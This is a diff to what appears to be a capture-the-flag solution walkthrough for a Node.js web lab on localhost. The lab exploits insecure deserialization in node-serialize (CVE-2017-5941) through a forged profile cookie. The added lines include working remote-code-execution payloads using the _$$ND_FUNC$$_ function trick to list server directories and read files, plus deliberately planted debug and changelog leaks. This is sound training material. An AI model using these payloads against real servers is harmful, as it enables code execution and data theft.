@@ -59,7 +59,7 @@ Application is available at `http://localhost:3001`.
 
 ### Step 3: Inspect the profile cookie
 
-Open DevTools (F12), go to **Application > Cookies > http://localhost:3001** (Chrome) or **Storage > Cookies** (Firefox). Find the cookie named `profile`.
+Open DevTools (F12), go to **Application > Cookies > http://localhost:3001** (Chrome) or **Storage > Cookies**. Find the cookie named `profile`.
 
 Decode its value in the browser console:
 
@@ -83,7 +83,7 @@ Any one of the following three paths leads to the same conclusion.
 
 **Path A -- HTML comment in page source:**
 
-Right-click the login page, view source. Find:
+Right-click the login page or the home dashboard, view source. Find:
 
 ```html
 <!-- legacy profile format: handled by node-serialize, see /package.json -->
@@ -91,21 +91,51 @@ Right-click the login page, view source. Find:
 
 **Path B -- /debug endpoint:**
 
-Click the faint "Internal Tools" link in the page footer, or navigate directly to `http://localhost:3001/debug`. The JSON response contains:
+Click the "Changelog" or "Internal Tools" link in the page footer, or navigate directly to `http://localhost:3001/debug`. The JSON response contains:
 
 ```json
 {
   "note": "Debug endpoint. Shows your parsed profile cookie.",
   "profile": { "username": "abcd12", ... },
-  "_engine": "node-serialize@0.0.4"
+  "_engine": "node-serialize@0.0.4",
+  "_engineNote": "Profile data is deserialized server-side on every page load using this engine.",
+  "_appRoot": "/app"
 }
 ```
 
-Visit it 4 or more times and a hint field appears:
+The `_appRoot` field gives the container's working directory (`/app`). A player can use this in two ways:
+
+**Option 1: Enumerate with a test payload first.**
+Before reading the flag file, use the RCE to list the directory and confirm the path exists. Craft a cookie with:
 
 ```json
-"_hint": "See https://www.npmjs.com/package/node-serialize and CVE-2017-5941"
+{
+  "username": "_$$ND_FUNC$$_function(){return require('fs').readdirSync('/app/src/data/flag-files').join(', ')}()"
+}
 ```
+
+Visit `/home`. The page renders the contents of `flag-files/` (e.g. `abcd12.txt, efgh34.txt, ijkl56.txt`), confirming the path and the exact filename before committing to the full read payload.
+
+**Option 2: Reason from the debug output.**
+The `/debug` response shows the parsed profile object under `profile`. That object came from `node-serialize`, which the app loaded. The app is Node.js, so the conventional layout is `src/data/` inside the project root. `_appRoot` is `/app`, so data files are at `/app/src/data/`. The flag files were named after the username (visible from the enumeration step, or guessable since the username is already known from the profile cookie).
+
+Visit it 2 or more times and a hint field appears:
+
+```json
+"_hint": "CVE-2017-5941: functions embedded in serialized data are reconstructed and immediately executed on deserialization. See https://www.npmjs.com/package/node-serialize"
+```
+
+**Path B2 -- /CHANGELOG.md:**
+
+Click the "Changelog" link in the page footer, or navigate to `http://localhost:3001/CHANGELOG.md`. The file contains:
+
+```
+[INFRA] Profile cookie uses node-serialize for session data persistence.
+        Supports complex data types including JavaScript functions.
+        See /package.json for the pinned version.
+```
+
+This names the library, confirms it handles functions, and points to `/package.json`.
 
 **Path C -- Exposed package.json:**
 
@@ -135,7 +165,25 @@ Example: this JSON, when deserialized, executes `require('fs').readFileSync(...)
 
 ### Step 6: Build the exploit payload
 
-Replace `abcd12` with your actual username. The flag file path inside the Docker container is `/app/src/data/flag-files/<username>.txt`.
+#### 6a: Confirm the flag file path (recommended)
+
+Use the RCE to list the directory before reading from it. This removes any guesswork about the path.
+
+In the browser console:
+
+```js
+document.cookie = "profile=" + btoa(JSON.stringify({
+  username: "_$$ND_FUNC$$_function(){return require('fs').readdirSync('/app/src/data/flag-files').join(', ')}()",
+  theme: "light",
+  lastVisit: new Date().toISOString()
+}));
+```
+
+Navigate to `/home`. The page renders something like: `Welcome back, abcd12.txt, efgh34.txt, ijkl56.txt`
+
+This confirms the directory exists and shows the exact filename for your user. The full path is `/app/src/data/flag-files/<username>.txt`.
+
+#### 6b: Read the flag
 
 **In the browser console, run this to generate the forged cookie value:**
 
@@ -269,7 +317,7 @@ Players who achieve RCE by any means and read their flag file should receive ful
 |------|-----------------------|----------------|
 | 1 | Log in, inspect cookies in DevTools | Beginner |
 | 2 | Base64-decode the cookie, read the JSON | Beginner |
-| 3 | Find node-serialize via HTML comment, /debug, or /package.json | Beginner |
+| 3 | Find node-serialize via HTML comment, /debug, /CHANGELOG.md, or /package.json | Beginner |
 | 4 | Look up CVE-2017-5941, understand the _$$ND_FUNC$$_ trigger | Beginner/Intermediate |
 | 5 | Construct the IIFE payload with the correct file path | Intermediate |
 | 6 | Replace the cookie and visit /home to retrieve the flag | Beginner |
